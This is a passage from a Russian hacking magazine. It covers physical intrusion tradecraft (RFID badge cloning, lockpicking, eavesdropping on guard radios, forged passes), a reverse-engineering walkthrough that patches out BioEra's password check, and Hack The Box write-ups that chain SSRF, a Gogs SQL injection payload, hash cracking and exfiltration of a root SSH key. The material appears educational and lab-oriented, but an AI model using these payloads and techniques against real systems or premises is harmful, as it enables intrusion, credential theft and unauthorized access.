образом получить дополнительную информацию о расположении объектов
тестирования, наличии камер наблюдения и прочего. Параллельно оцениваем
замки на сложность взлома, расположение и тип пропускных зон, а также сос‐
тавляем психологический портрет персонала, чтобы знать, как себя лучше вес‐
ти при непосредственном проникновении.


Пример из личного опыта
Я представился специалистом, претендующим на вакансию в департамент
ИТ‑поддержки. В конце интервью, как правило, соискателю предлагают задать
уточняющие вопросы о компании, поэтому я выяснил:
 • технологии, с которыми нужно будет работать;
 • контакты курирующих сотрудников (люди, которые помогают новичку адап‐
   тироваться и втянуться в работу);
 • способ получения временного пропуска для прохождения обзорной экскур‐
   сии.



По мере накопления опыта ты сам начнешь чувствовать, какие тактики в каких
случаях лучше срабатывают. То, что я описал, — это лишь вектор для даль‐
нейших действий.


КАК ПРОНИКНУТЬ НА ОБЪЕКТ?

Проникнуть можно либо через уязвимые места периметра, о которых я уже
говорил, либо методами социальной инженерии. Ищем способ сделать копию
электронного пропуска либо выдаем себя за работника обслуживающего пер‐
сонала  (инженер,  уборщик,  охранник),  соискателя на  вакансию,  курьера
или еще кого‑то, кого пропустят не территорию без подозрений.


КАК КЛОНИРОВАТЬ БЕЙДЖ?

Чтобы   клонировать  бейдж,  открывающий   двери,  обычно  используют
Proxmark — устройство для анализа, чтения и клонирования меток RFID.
   Существует пять популярных вариаций Proxmark:
 • Proxmark3;
 • Proxmark3 Easy (V3.0);
 • Proxmark3 RDV2;
 • Proxmark3 EVO;
 • Proxmark3 RDV4.

Хотя последние версии более навороченные, возможностей даже самой пер‐
вой вполне достаточно для наших задач.
   Потребуется также установить драйверы, чтобы твой ноутбук смог увидеть
устройство, и утилиту Proxmark. При помощи утилиты ты можешь управлять
устройством — считывать информацию с карт и записывать ее на карты‑бол‐
ванки.
  Имей в виду, что дальность действия гаджета ограниченна. Он может счи‐
тать карту на расстоянии до 15 см в идеальных условиях.


        WWW

                          Документация Proxmark3




КАКИЕ БОЛВАНКИ НУЖНЫ ДЛЯ ПРОПУСКОВ?

Разные пропускные системы могут применять разные типы RFID-болванок.
Есть два основных типа меток RFID — низкочастотные и высокочастотные:
 • низкочастотные (125 кГц) имеют большую дальность чтения, используются
   в примитивных системах контроля доступа: на предприятиях, в офисных
    пропусках, абонементах в спортзал, домофонах и так далее;
 • высокочастотные (13,56 МГц) имеют меньшую дальность работы по срав‐
  нению с низкочастотными, используются в бесконтактных банковских кар‐
    тах, проездных билетах, безопасных пропусках.


ПРИДЕТСЯ ЛИ ИСПОЛЬЗОВАТЬ ОТМЫЧКИ?

Отмычки, безусловно, пригодятся. Для взлома как дверных замков, так и зам‐
ков на серверных шкафах и защищенных панелях ПК. Возможно, даже придет‐
ся снимать блокираторы на портах USB и Ethernet.





До «боевого вылета» настоятельно советую попрактиковаться на учебных зам‐
ках, разные виды которых можно найти в интернет‑магазинах. Очевидно, что
скорость вскрытия напрямую зависит от опыта и общего понимания уязвимос‐
ти замков. А так как время на объекте часто работает против нас, долгое
копание с замком может «спалить контору» и плачевно сказаться на резуль‐
татах всей проверки. Еще и по почкам от охраны можно огрести, пока будешь
искать бумажку с разрешением начальника организации на проведение про‐
верки. Так что не ленись! Закупи несколько разных видов замков и качай скилл
дома в тепле.


             INFO

                        Подробнее  о   локпикинге  читай  в  статье
                            « LockPick. Какие бывают типы замков и почему
                       все их можно вскрыть».



КАК СНИЗИТЬ РИСК БЫТЬ ПОЙМАННЫМ?

Чтобы тебя не изловила охрана, будет крайне полезно знать, о чем охранники
говорят по рации. Для перехвата радиосигнала существует отличный девайс —
HackRF One. С его помощью на этапе разведки ты можешь перехватить час‐
тоту, на которой работают рации охранников, и почерпнуть из их разговоров
массу полезной информации: маршруты патрулирования, расписание перес‐
менок и так далее. Но самое важное — контроль скрытности наших действий.
Как только слышим переговоры о каком‑то сомнительном хмыре, рыскающем
по территории, делаем вывод, что пора сваливать или прятаться.
   Для работы с гаджетом тебе понадобится утилита SDRSharp.


Настройка утилиты SDRSharp в Windows

 1. Идем на сайт разработчика и скачиваем архив sdrsharp-x86.zip.
 2. Создаем на диске папку с названием sdrsharp и распаковываем туда наш
   архив. В распакованной папке находим файл install-rtlsdr.bat и запускаем
   его. На экране появится командная строка, которая автоматически закроет‐
   ся  в  течение  нескольких  секунд. В  папке  появятся  файлы  rtlsdr.dll
   и zadig.exe.
 3. Если эти файлы не появились — попробуй на время установки отключить
   антивирус и повтори перечисленные выше действия.
 4. Подключаем SDR-приемник по USB и запускаем файл Zadig.exe (от имени
   администратора!). Нажимаем Options, ставим  галочку в строке  List  All
   Devices.
 5. В строке Device выбираем Bulk-In, Interface (Interface 0). Могут выпадать
   и другие устройства, такие как RTL2832U или RTL2832UHIDIR, их тоже мож‐
   но выбирать. В строке Driver после зеленой стрелки должно стоять WinUSB,
   в строке USB ID — 0BDA 2838 00.
 6. Жмем кнопку Replace Driver, игнорируем системное сообщение с предуп‐
   реждением, жмем «Установить».
 7. В папке с распакованной программой SDRSharp находим и запускаем файл
   SDRSharp.exe. После запуска программы под строкой Source нажимаем
   на  треугольник выбора  устройств.  Выбираем наше  устройство RTL-
   SDR(USB).
 8. Устройство выбрано — теперь нажимаем шестеренку вверху слева. Далее
   выходит окошко RTL-SDR Controller — задаем следующие параметры:
    • необходимую частоту;
    • тип модуляции — WFM;
    • Sample Rate — 2048 MSPS;
    • RTL AGC — включаем;
    • ползунок регулировать в районе 20 дБ по ситуации.
 9. Нажимаем  кнопку  Play  слева  вверху.  Программа  запущена и  готова
   к работе.





КАКИЕ ЕЩЕ ИНСТРУМЕНТЫ МОГУТ ПРИГОДИТЬСЯ?

Простор для фантазии здесь огромный. Например,  ловко  установленная
на этапе разведки скрытая камера поможет тебе в наблюдении и анализе
обстановки. Может пригодиться и квадрокоптер — с его помощью ты узнаешь
много нового о конструкции и особенности здания, найдешь пожарные лес‐
тницы, технические люки и чердаки. Можешь заприметить и камеры с постами
охраны, но помни, что и они твой агрегат тоже заметят.
  Еще тебя может выручить поддельный пропуск. Сделать качественный про‐
пускной документ несложно. В интернете полно шаблонов на любой вкус:
начиная от работника СМИ и заканчивая сотрудником подрядной организации.
Для большей убедительности на них можно наклеить соответствующие голог‐
раммы — они тоже продаются. Более «мягкий» вариант — подделка бейджа
сотрудника.
   Опять же понимание того, какие средства будут полезными, а на какие ты
только зря потратишь время и силы, придет с опытом. Иногда действительно
нужен целый рюкзак  всякого барахла, но может не пригодиться вообще
ничего, кроме ноутбука и вежливой улыбки.


ПРИМЕР ПРОНИКНОВЕНИЯ

Все бумаги были подписаны, разрешения получены, и в день проникновения я
вошел в центральный вход бизнес‑центра, успешно миновал проходную бла‐
годаря скопированному ранее пропуску и направился к офису заказчика.
   Как уточнялось в ТЗ, вход в офис регулировался отдельной картой, которой
на тот момент у меня не было. Так что я просто достал телефон и начал ими‐
тировать деловую беседу в ожидании, что кто‑нибудь откроет нужную мне
дверь. Минут через пять один из сотрудников компании‑заказчика наконец
соизволил пройти в нужный офис и позволил мне прошмыгнуть за ним. Кстати,
для метода следования по пятам легитимного сотрудника в нужные помеще‐
ния даже есть специальный термин — tailgating.
   Внутри офиса большая часть помещений была открыта, и я начал заходить
во все подряд. Через какое‑то время один из сотрудников, увидев посторон‐
него человека в помещении, спросил, чем я тут, собственно говоря, занима‐
юсь. Для успокоения бдительного работника я рассказал заранее заготов‐
ленную легенду о том, что я инженер и настраиваю сетевое оборудование.
Этого оказалось достаточно, и больше никто из сотрудников не обращал
на меня внимания.
   Моему взору предстали рабочие столы сотрудников с беспечно лежащими
на них печатями, USB-токенами, множество документов и жестких дисков
(потенциально содержащих конфиденциальную информацию). Ай‑яй‑яй!
  За время осмотра офиса я также подметил, что одна из дверей закрыта
на электронный замок. Зато прилегающее к ней помещение было открыто
и пустовало. Когда я туда заглянул, выяснилось, что от запертой комнаты меня
отделяет лишь невысокая перегородка, через которую я невозмутимо перелез.
Внутри было несколько работающих компьютеров, один из которых не был
заблокирован. Открыв на нем браузер, я смог увидеть все сохраненные
пароли, получил возможность изучить всю личную и внутреннюю переписку,
а также запустить корпоративную программу, работа с которой может повлиять
на бизнес‑процессы компании.
   Закончив осмотр офиса, я отправился на разведку по коридорам и нашел
серверную. Дверь была заперта, но я постучал, и мне открыл админ, который
не был предупрежден о проверке. Я вежливо представился инженером сто‐
ронней компании, который опять же, согласно легенде, по согласованию с тех‐
ническим директором должен был провести настройку сетевого оборудования.
   Наивный и радушный админ спокойно пропустил меня внутрь и даже помог
найти подходящий разъем Ethernet для моего ноута. Я же, одурев от собствен‐
ной безнаказанности, помимо прочего, успел скопировать его пропуск, когда
тот  отвернулся. Через какое‑то время имитации бурной  деятельности я
и горемычный админ вышли покурить, после чего тот отправился на обед. Я же
вернулся в серверную и прошел внутрь по скопированной ранее карте. Быс‐
тренько подобрав отмычки, вскрыл серверный шкаф и задокументировал
это достижение на фото во всех ракурсах.
   Так как скопированный мной пропуск был админским (а они обычно имеют
доступ к большинству технических помещений), проникновение в хранилище,
где лежали резервные копии, тоже не было проблемой. Серверный ящик я
вскрыл и тоже запечатлел это для протокола.
  На этом все мои задачи были выполнены. Я спокойно вышел через ту же
проходную, что и вошел, и отправился уже в свой офис строчить отчет о про‐
деланной работе.
ВЗЛОМ





       ИЗУЧАЕМ ПРИЛОЖЕНИЕ,
        СОЗДАННОЕ В BIOERA





Диковинных  сред   разработки   софта
существует множество. Сред визуального
программирования —   чуть   меньше,
а популярные среди них и вовсе можно
пересчитать  по  пальцам.  Сегодня  я            МВК
покажу,  как  можно  обойти  парольную
защиту   в    программах,    созданных
с помощью довольно редкого инструмента
под названием BioEra.


Этой статьей я продолжаю тему визуального программирования, свое отно‐
шение к которому я уже подробно и исчерпывающе выразил в статье с говоря‐
щим названием «Полное G. Ломаем приложение на языке G, созданное
в LabVIEW». А что, если программу из этой статьи написать на Java, потом час‐
тично скомпилировать, а частично — зашифровать код? Получится софтина,
собранная с использованием проекта BioEra!
  Из информации на сайте (имеющем весьма спартанский дизайн, как и сама
среда программирования) можно узнать, что инструмент позволяет создавать
кросс‑платформенные приложения для обработки сигналов с датчиков и игро‐
вых контроллеров. Еще в BioEra можно разрабатывать софт для обработки зву‐
ка, что характерно, абсолютно не имея навыков программирования — как раз
то, что нужно современному начинающему кодеру!


           WARNING

                       Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный  с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Дабы не нарушать законы, скачаем с сайта триальную версию этой среды раз‐
работки и попробуем решить простую задачу: обойти парольную защиту
на редактирование скомпилированных в BioEra файлов визуальных проектов .
BPD (разработчики гордо называют их «дизайнами»). Как и в любой другой сре‐
де разработки visual programming language (типа LabView), проект тут в прямом
смысле рисуется в визуальном редакторе в виде блок‑схемы.





Разумеется, при такой открытости исходников в BioEra существуют способы
оградить «дизайн» от шаловливых ручек хакеров, которым вздумается дизас‐
семблировать, а то и поправить проект. Защита тут используется попроще,
чем в LabView, но все равно можно поставить на «дизайн» пароль на открытие
и редактирование визуальной блок‑схемы. Именно такую защиту мы и поп‐
робуем обойти, ведь это путь к постижению логики построения приложений
данной среды разработки.
   Сразу забегая вперед, скажу, что существует и более простой способ —
сервисный режим разработчика, в котором парольная защита просто игно‐
рируется, но мы легких путей не ищем и занимаемся решением этой задачи
исключительно из спортивного интереса в познавательных целях.
   Итак, смотрим файл bioera.exe из скачанного и установленного триала.
DetectItEasy не видит на нем никакой защиты и предполагает, что приложение
написано на си. Запускаем его и пытаемся им открыть запароленный дизайн.
Выскакивает окошко ввода пароля.





Таких строк нет в EXE-файле, более того, их нет вообще ни в одном файле
установленного пакета, когда мы пытаемся их отыскать глобальным поиском.
Топорный дизайн окон напоминает Java, в пакете действительно обнаружи‐
вается великое множество Jar-библиотек, но поиск по их содержимому тоже
ничего не дает. Аттачимся к запущенному процессу при помощи нашего
любимого отладчика x32dbg и видим, что это не то чтобы совсем явная Java, —
виртуальная машина JVM интегрирована прямо в EXE-файл. Нечто подобное я
описывал в  своей статье  «Суровая жаба.  Изучаем защиту  Excelsior JET
для программ на Java».





                  Стек вызовов прерванного процесса

То, что ядро этого монстра написано на примитивной 32-битной Java, — вне
всякого сомнения, нужно лишь выяснить, где именно находится этот код, ведь
простым поиском его в файлах проекта не обнаружить. Значит, он или хитро
упакован, или зашифрован.
   Попробуем подойти к решению задачи с другой стороны: отследим файлы,
к которым приложение обращается при загрузке. Для этого запускаем утилиту
Process Monitor (ProcMon),  устанавливаем фильтр на процесс bioera.exe
и отслеживаем все его обращения к файловой системе. Очень непростое
решение, поскольку мы по опыту уже знаем, насколько длинные простыни
обращений к самым разным файлам нам придется отслеживать в результате.
  В нашем случае самым главным кандидатом на вместилище кода будет
довольно увесистый файл be.cbe из подкаталога \ext, который  грузится
в память целиком последовательными порциями по 65 535  (0xFFFF) байт.
При беглом просмотре этот файл (за исключением 5-байтового заголовка
CBE01) представляет собой умеренно энтропическую кашу из символов — он
явно упакован или зашифрован каким‑то алгоритмом собственного изоб‐
ретения.
   Ну что ж, попробуем его изучить. Для этого снова загружаем отладчик
x32dbg и запускаем  оттуда файл bioera.exe, предварительно установив
условную  точку  останова на ReadFile с условием  остановки [esp+0xC]
==0x0FFFF. В первый раз нас ждет осечка — программа в отладчике завер‐
шается, не достигнув точки останова. Однако на экране окно программы
все‑таки загрузилось, уже вне отладчика.
   Пробуем приаттачиться к ее процессу и видим, что программа просто
перезагрузила сама себя со следующими параметрами командной строки:


"C:\Program Files (x86)\BioEraTrial\bioera.exe" launcher -root C:\
Program%20Files%20(x86)\BioEraTrial\ -j15

Меняем в x32dbg командную строку на эту и снова запускаем приложение.
На этот раз точка останова срабатывает. Искомый вызов из — это стандар‐
тный Java- загрузчик заданного количества байтов из файла:


<_Java_java_io_FileInputStream_readBytes@20>

Попробуем отследить дальнейшую судьбу прочитанных с его помощью байтов.
Эта задача будет чуть посложнее. Для начала ставим точку останова на доступ
к какому‑нибудь байту из свежесчитанного буфера. Прочитанные байты будут
несколько раз перемещаться из массива в массив, и каждый раз придется уби‐
рать аппаратную точку останова в прежней локации и переставлять ее на новое
место. В конце концов наши усилия увенчиваются успехом: нужный байт
выбирается из массива из скомпилированного JVM-кода:


movsx ebx,byte ptr ds:[edx+eax+C]
mov eax,ebx                           ;
eax <- считанный из буфера байт
movzx ebx,byte ptr ds:[esi+1]        ; esi — указатель на
следующий JVM-опкод, который загружается в ebx
inc esi                                ; Следующий опкод в esi
jmp dword ptr ds:[ebx*4+6DA6C148]    ;
 Переход на обработчик следующего опкода

Как видим, в нашей версии приложения реализована довольно примитив‐
ная 32-битная Java-машина. JVM-код даже не скомпилирован, а просто интер‐
претируется в процессе выполнения, чем объясняется изрядная неповорот‐
ливость программы. В принципе, если у тебя есть в запасе уйма свободного
времени, ты можешь дизассемблировать алгоритм расшифровки, попрыгав
в отладчике по коду, но мы поступим проще. Ведь это не какие‑нибудь
Themida или VMProtect, а вполне заурядная и широко известная JVM, ее сис‐
тема команд  задокументирована, и  у  нас в  регистре esi  есть адрес
на исполняемый в данный момент шитый код.





                  Стек вызовов прерванного процесса

К примеру, код текущей исполняемой инструкции (обработчик которой при‐
веден выше, на скриншоте jy выделен красным) — 33h, это baload. Можно
даже угадать имя исполняемого метода  ( decode) и его класс  (be.read.
Cipher). Осталось только найти этот класс и по‑человечески декомпилировать.
  К сожалению, глобальным поиском нужный нам класс тоже не находится.
Похоже, мы вышли на ядро какого‑то более глубокого уровня, копать который
по описанному выше методу нам уже надоело и неинтересно. Поэтому на этот
раз мы схалтурим — просто найдем этот класс в исходном виде в памяти про‐
цесса по шаблону (скажем, тот же be/read/Cipher) и сдампим его в файл,
начиная с сигнатуры CAFEBABE.





                  Стек вызовов прерванного процесса

Декомпилировав этот класс, мы получаем используемые в BioEra алгоритмы
шифрования и дешифрования. Они совершенно примитивны, хотя чуть слож‐
нее по исполнению обычного XOR:


package be.read;


public class Cipher {
    public static final int LEN = 311;
    static final int BIGLEN = 79616;
    protected byte[] buffer = new byte[311];
    private byte[] eb = new byte[311];
    static final int k1 = 19;
    static final int k2 = 236;


    protected void decrypt() {
        int i = 311;
        while (--i >= 0) {
            this.eb[i] = (byte)((this.buffer[i] & 0x13) + (this.
buffer[(i + 7) % 311] & 0xEC));
        }
        i = 311;
        while (--i >= 0) {
            this.buffer[i] = (byte)(this.eb[i] - i * 13 % 17);
        }
    }


    protected void encrypt() {
        int i = 311;
        while (--i >= 0) {
            this.eb[i] = (byte)(this.buffer[i] + i * 13 % 17);
        }
        i = 311;
        while (--i >= 0) {
            this.buffer[i] = (byte)((this.eb[i] & 0x13) + (this.eb
[(i - 7 + 79616) % 311] & 0xEC));
        }
    }
}

Теперь, когда у нас есть эти алгоритмы, компилируем простенький декодер
и расшифровываем им файл be.cbe. В раскодированном виде он представ‐
ляет собой последовательность откомпилированных и обфусцированных клас‐
сов, которые можно выделять и отрезать по сигнатурам CAFEBABE для деком‐
пиляции. Поиск по строке "Protected  design" выводит нас на класс mF,
который, помимо проверки пароля для защищенного дизайна, содержит мно‐
жество других вкусняшек типа проверки донгла, лицензии, сигнатур (в частнос‐
ти, упомянутый выше сервисный режим). Но наша задача — обойти проверку
пароля. Искомое место легко находится в декомпилированном коде в методе
public static final int a(Pi pi, uI uI2, String string) и выглядит
так:


    PF pF = new PF(m.p.J(), "Protected design");
        pF.c = true;
        if (nE.c()) {
            System.out.println("DEV - Skipping nes des pwd dlg");
        } else {
            pF.b("Password");
        }
        if (nE.c() || pF.b && pF.q().equals(uI2.l.toString()))
// Если убрать эту проверку, то любой введенный пароль будет
приниматься как родной
        {
            m.p.R = false;
            rA.f = true;
            return 5;
        }

Как видно из кода, по‑хорошему можно было бы пропатчить класс nE.c(), тог‐
да окно пароля вообще не будет появляться, но нам уже все надоело и искать,
а потом декомпилировать этот класс просто лень. Поэтому берем нашего
любимого «Грязного Джо» (я писал о нем в статье «Грязный Джо. Взламываем
Java-приложения с помощью dirtyJOE») и ищем последовательность опкодов,
соответствующих выражению nE.c() внутри условия if  (...). Выглядит
это вот так.





                  Стек вызовов прерванного процесса

Чтобы условный переход  всегда отрабатывал, выделенную красным  пос‐
ледовательность нужно заменить true (04). В итоге нам надо в расшифро‐
ванном файле be.cbe найти последовательность байтов B8 01 B7 9A 00 1D,
первые три из которых исправить на 00 00 04, а потом зашифровать файл
обратно. Проделываем это и убеждаемся, что теперь защищенные дизайны
открываются при вводе любого пароля безо всякого сервисного режима.


ВЫВОДЫ

Возможно, читатель упрекнет меня в том, что мы потратили столько времени
и сил впустую. Ведь, судя по последним новостям на этом сайте, эта среда
разработки не завоевала популярности и, скорее всего, не успела расползтись
по миру. Поэтому вероятность встретиться с созданными при помощи BioEra
программами у читателя невысока. Однако мы препарировали этого мертво‐
рожденного монстра просто из любви к экзотике и в ознакомительных целях —
для приобретения опыта реверса нестандартных Java-приложений.
ВЗЛОМ

       HTB
 HEALTH





        ЭКСПЛУАТИРУЕМ SSRF
        ОТ ПЕРВОНАЧАЛЬНОГО
             ДОСТУПА
        ДО ЗАХВАТА ХОСТА



В этом райтапе я покажу, как искать и экс‐
плуатировать уязвимость SSRF. В допол‐
нение к ней мы заюзаем SQL-инъекцию
в GoGits, а затем дополним нашу атаку
манипуляцией содержимым базы данных             RalfHacker                                                                                          hackerralf8@gmail.com
сервиса. Это позволит нам получить кри‐
тически  важные  данные  и   контроль
над машиной.


Наша цель — тренировочный стенд Health с площадки Hack The Box. Слож‐
ность задачи оценена ее авторами как средняя.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.176    health.htb

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

Скрипт нашел два открытых порта: 22 — служба OpenSSH 7.6p1 и 80 —
веб‑сервер Apache 2.4.29. Сразу идем на веб‑сервер.





                    Главная страница сайта http://health.htb


ТОЧКА ВХОДА
Давай заполним необходимые поля и отправим данные. В полях URL можно
указать адрес своего веб‑сервера. Предварительно запустим его:


python3 -m http.server 8080





                       Форма отправки данных



                                Логи веб‑сервера

В логах веб‑сервера видим два запроса. Первый — это GET-запрос на указан‐
ный Monitored URL, а второй — POST-запрос на Payload URL. Так как http.
server не показывает нам полные данные, нужно написать свою реализацию.
Давай напишем программу, которая будет выводить HTTP-заголовки, а в слу‐
чае с POST-запросом — еще и переданные данные.


from http.server import BaseHTTPRequestHandler, HTTPServer
import logging


class Serv(BaseHTTPRequestHandler):
   def do_GET(self):
       print("GET " + str(self.path))
       print(str(self.headers))
       self.send_response(200)
       self.send_header('Content-type', 'text/html')
       self.end_headers()


   def do_POST(self):
       content_length = int(self.headers['Content-Length'])
       post_data = self.rfile.read(content_length)
       print("POST " + str(self.path))
       print(str(self.headers))
       print(post_data.decode('utf-8'))
       self.send_response(200)
       self.send_header('Content-type', 'text/html')
       self.end_headers()


   def log_message(self, format, *args):
       return


logging.basicConfig(level=logging.INFO)
httpd = HTTPServer(('', 8080), Serv)
httpd.serve_forever()
httpd.server_close()

Запускаем и делаем повторный запрос.





                              Результат работы сервера

Видим, что в данных POST-запроса передается информация об указанных
URL, а также пометка down. Давай попробуем дать какой‑нибудь ответ на GET-
запрос. Для этого изменим метод do_GET:


class Serv(BaseHTTPRequestHandler):
   def do_GET(self):
       print("GET " + str(self.path))
       print(str(self.headers))
       self.send_response(200)
       self.send_header('Content-type', 'text/html')
       self.end_headers()
       self.wfile.write("<test>RALF_SERVER<test>".encode('utf-8'))





                                Логи веб‑сервера

И теперь видим, что в данных POST-запроса нам передают наш же ответ
на GET-запрос. Значит, нужно проверить, нет ли здесь возможности для экс‐
плуатации SSRF — то есть возможности подделки запросов.


ТОЧКА ОПОРЫ
SSRF
Первым делом я попробовал добраться до файла /etc/passwd, для чего ука‐
зал в качестве URL file:///etc/passwd/id_rsa, но получил следующее пре‐
дупреждение.





                     Предупреждение при запросе файла

Запросить данные с адреса 127.0.0.1 тоже не вышло, но я вспомнил старый
трюк с редиректом. Так как проводится фильтрация именно введенных в поле
URL данных, мы можем обратиться к 127.0.0.1 в обход этого поля. Для этого
нам нужно отправить чекер на свою страницу, которая перешлет клиента
на 127.0.0.1. Изменим метод do_GET для выполнения редиректа.


def do_GET(self):
    self.send_response(301)
    self.send_header('Location', 'http://127.0.0.1/')
    self.end_headers()

Повторяем атаку и получаем уже знакомую страницу самого же сервера, что
подтверждает наличие уязвимости SSRF.





                             Эксфильтрация данных

Для поиска портов, которые могут быть открыты для подключения с локального
хоста, можно воспользоваться SYN-сканированием.


sudo nmap -p- -sS --min-rate=1500 health.htb





                           Результат сканирования портов

Находим порт 3000, который как раз фильтруется. Попробуем вытянуть дан‐
ные с него. Указываем другой URL в обработчике GET:


self.send_header('Location', 'http://127.0.0.1:3000/')

Для удобства я немного изменил обработчик POST, чтобы из ответа сервера
автоматически извлекался код HTML, сохранялся в файл и открывался в бра‐
узере.


def do_POST(self):
       content_length = int(self.headers['Content-Length'])
       post_data = self.rfile.read(content_length)
       print(post_data.decode('utf-8'))
       f = open('page.html', 'wt')
       f.write(json.loads(post_data.decode('utf-8'))['body'])
       f.close()
       subprocess.run(["firefox", "page.html"])
       self.send_response(200)
       self.send_header('Content-type', 'text/html')
       self.end_headers()

Делаем новый запрос и в открывшемся браузере видим страницу авторизации
Gogs.





                             Полученные данные

Эта страница раскрывает нам версию платформы, что поможет при поиске
известных уязвимостей. Один запрос к Google, и первая же ссылка дает нам
описание готового эксплоита.





                              Результат поиска в Google

Таким образом мы узнаем, что в этой версии Gogs есть возможность провести
SQL-инъекцию на странице search через параметр q.





                     Описание способа эксплуатации

Для эксплуатации нам нужно только менять URL в коде нашего обработчика
GET-запросов. Приведенный в PoC пример у меня не сработал, поэтому
пришлось немного переработать запрос. Вытянуть версию не получилось,
но зато добиваемся выполнения вложенного SQL-запроса select '123'.


http://127.0.0.1:3000/api/v1/users/search?q= qwe ')/**/union/**/all/
**/select/**/null,null,(select/**/' 123 '),null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null/**/--/**/



                             Полученные данные


ПРОДВИЖЕНИЕ
Gogs SQL Injection
Итак, мы можем выполнять запросы, но получить информацию о структуре таб‐
лицы у меня не вышло. Поэтому я скачал исходники Gogs и порылся в них. Там
находим структуру User.





                                Структура User

Нас здесь интересуют поля name, passwd и salt.


http://127.0.0.1:3000/api/v1/users/search?q= qwe ')/**/union/**/all/
**/select/**/null,null,(select/**/name/**/from/**/user),null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null/**/--/**/



                         Получение имени пользователя


http://127.0.0.1:3000/api/v1/users/search?q= qwe ')/**/union/**/all/
**/select/**/null,null,(select/**/passwd/**/from/**/user),null,
null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null/**/--/**/


                      Получение хеша пароля пользователя


http://127.0.0.1:3000/api/v1/users/search?q= qwe ')/**/union/**/all/
**/select/**/null,null,(select/**/salt/**/from/**/user),null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null/**/--/**/



                        Получение соли для хеширования

Теперь нужно разобраться с алгоритмом хеширования. Так, в issue на GitHub
находим упоминание самого алгоритма.





                  Информация об алгоритме хеширования

И уже по ключевому слову находим сам код в исходниках.





                  Исходный код функции EncodePassword

У нас есть все параметры для перебора хеша. Приводим его к формату
hashcat:


echo
'66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d
6c032f0fd4ef83f48d74349ec196f4efe37'
 | xxd -r -ps | base64


echo 'sO3XIbeW14' | base64





                      Преобразование к формату hashcat

А теперь брутим хеш, для чего указываем режим 10900:


hashcat -m 10900 sha.hash rockyou.txt





                                  Результат перебора

С полученным паролем подключаемся по SSH и забираем первый флаг.




                        Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Теперь, когда мы получили доступ к хосту, нам нужно собрать информацию,
которая поможет в повышении привилегий. Источников очень много, и для
автоматизации поисков я обычно использую скрипты PEASS. С их помощью
обнаруживаем учетные данные для подключения к базе данных.





                          Переменные окружения

Больше ничего найти не удалось, да и сама база ничего нам не дала. Тогда
отследим запускаемые на хосте процессы с помощью pspy64 . Простое ожи‐
дание ничего не дало — все спокойно. Тогда попробуем пройти по всем фун‐
кциям сайта и посмотреть, приведет ли это к выполнению каких‑либо прог‐
рамм в системе. После создания веб‑хука в консоли посыпались логи.





                            Создание веб‑хука





                                     Логи pspy

Подключимся к базе данных и посмотрим содержимое таблицы tasks.


mysql -Dlaravel -ularavel -pMYsql_strongestpass@2014+


select * from tasks;





                        Содержимое таблицы tasks

И получаем указанный нами URL, данные по которому будут отправлены
на наш сервер! В самом начале прохождения я пытался получить содержимое
файла, но помешал фильтр. Теперь же мы можем, минуя фильтры, просто под‐
менить запись в базе данных. Эксфильтровать попробуем приватный SSH-
ключ рута.


update tasks set monitoredUrl='file:///root/.ssh/id_rsa';





                    Изменение данных в таблице tasks





                                  Логи листенера

И на открытый листенер прилетает запрос, где мы можем найти SSH-ключ
пользователя root. С этим ключом подключаемся к системе и забираем второй
флаг.




                            Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
 SHOPPY





      ПОВЫШАЕМ ПРИВИЛЕГИИ
        ЧЕРЕЗ ГРУППУ DOCKER





В этом райтапе я покажу разные техники
сканирования  веб‑сайта, затем  проэкс‐
плуатируем инъекцию NoSQL, чтобы обой‐
ти авторизацию. Под конец прохождения
разберемся с пользовательским менед‐             RalfHacker                                                                                          hackerralf8@gmail.com
жером паролей и повысим  привилегии
через группу Docker.


Нашей целью будет захват тренировочной машины Shoppy с площадки Hack
The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.180    shoppy.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

Скрипт нашел нам два открытых порта: 22 — служба OpenSSH 8.4p1 и 80 —
